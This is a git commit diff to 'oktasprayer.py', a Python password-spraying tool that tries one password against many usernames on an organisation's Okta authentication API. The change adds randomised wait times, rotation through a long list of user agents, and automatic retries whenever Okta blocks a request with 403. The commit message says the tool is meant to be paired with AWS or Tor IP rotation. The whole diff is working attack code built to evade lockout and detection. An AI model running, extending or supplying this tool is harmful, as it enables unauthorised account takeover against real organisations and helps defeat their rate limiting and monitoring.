f3c5d140955e99f5ac67b7b73e9ab67ef3313354
pppxo <50279784+pppxo@users.noreply.github.com>
2025-12-02 17:46:06 +0300

    Enhance wait time and user-agent randomization
    Updated command-line arguments to include minimum and maximum wait times. Added randomization of wait times and user agents for each request.
    
    This fork to be used with IP rotations such as AWS IP rotation or using TOR.

--- oktasprayer.py
+++ oktasprayer.py
@@ -4,48 +4,111 @@ from optparse import OptionParser
 import sys
 import time
 import getpass
+import random
 
-if ((len(sys.argv) < 7 or len(sys.argv) > 7) and '-h' not in sys.argv):
+if ((len(sys.argv) < 9 or len(sys.argv) > 9) and '-h' not in sys.argv):
     print("\nUsage:")
-    print("python3 %s -f <inputfile> -d <domain> -w <wait_time>\nThen enter password to spray with when prompted.\n" % sys.argv[0])
+    print("python3 %s -f <inputfile> -d <domain>\nThen enter password to spray with when prompted.\n" % sys.argv[0])
     sys.exit(1)
 
 
 parser = OptionParser()
 parser.add_option("-f", "--inputfile", help="File with usernames")
 parser.add_option("-d", "--domain", help="Company domain")
-parser.add_option("-w", "--wait", help="Seconds to wait between each spray attempt")
+parser.add_option("-n", "--min", help="Minimum seconds to wait between each spray attempt")
+parser.add_option("-x", "--max", help="Maximum seconds to wait between each spray attempt")
 (options, args) = parser.parse_args()
 
 password = getpass.getpass()
 
 domain = options.domain.partition('.')
 domain2 = domain[0]
-sleeptime = int(options.wait)
+min_wait = int(options.min)
+max_wait = int(options.max)
 
 oktadomain = '%s.okta.com' % domain2
 
+# user agents to randomize each request
+user_agents = [
+    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (iPad; CPU OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
+    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
+    "Mozilla/5.0 (Linux; Android 14; CPH2449) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; V2303) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; CPH2269) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.8 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.7 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 14; 22101316G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; 21061119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
+    "Mozilla/5.0 (Linux; Android 12; ELS-NX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_14_6; en-us) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.8 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.92 Safari/537.36",
+    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
+]
+
+
 url = 'https://%s/api/v1/authn' % oktadomain
-headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'}
 
 print("+"*100)
 print("Okta Password Sprayer")
 print("+"*100)
-print("Spraying...with a wait time of %s..." % options.wait)
+print(f"Spraying...with a random wait time between {min_wait}-{max_wait} seconds...")
 with open ("%s" % options.inputfile, "r") as oktausers:
     for line in oktausers:
+        sleeptime = random.randint(min_wait, max_wait)
         try:
             usr = line.strip()
             data = {"username":"{}".format(usr),"options":{"warnBeforePasswordExpired":"true","multiOptionalFactorEnroll":"true"},"password":"{}".format(password)}
-            print("--Waiting %s seconds..." % options.wait)
+            print("--Waiting %s seconds..." % sleeptime)
             time.sleep(sleeptime)
+            headers = {'User-Agent': random.choice(user_agents)}
             response = requests.post(url, headers=headers, json=data)
+            
             if response.status_code == 200:
                 print("\033[92mlogin successful - %s:%s\033[0m" % (usr, password))
                 print("\033[1mOkta Response Info:\033[0m")
                 print(response.text)
                 response.close()
+            elif response.status_code == 403:
+                print("\033[93mForbidden access - %s (%s)\033[0m" % (usr, response.status_code))
+                # retry as long as response is 403
+                while response.status_code == 403:
+                    sleeptime = random.randint(min_wait, max_wait)
+                    print("[+]> repeating the request after wait time]")
+                    print("--Waiting %s seconds..." % sleeptime)
+                    time.sleep(sleeptime)
+                    headers = {'User-Agent': random.choice(user_agents)}
+                    response = requests.post(url, headers=headers, json=data)
+                    if response.status_code == 200:
+                        print("\033[92mlogin successful - %s:%s\033[0m" % (usr, password))
+                        print("\033[1mOkta Response Info:\033[0m")
+                        print(response.text)
+                    elif response.status_code == 401:
+                        print("\033[91mAuthentication failed - %s:%s (%s)\033[0m" % (usr, password, response.status_code))
+                    else:
+                        print("\033[91mError - %s:%s\033[0m" % (usr, password))
+                response.close()
+            elif response.status_code == 401:
+                print("\033[91mAuthentication failed - %s:%s (%s)\033[0m" % (usr, password, response.status_code))
             else:
-                print("\033[91mAuthentication failed - %s:%s\033[0m" % (usr, password))
+                print("\033[91mError - %s:%s\033[0m" % (usr, password))
+
         except Exception as e:
             print(e)
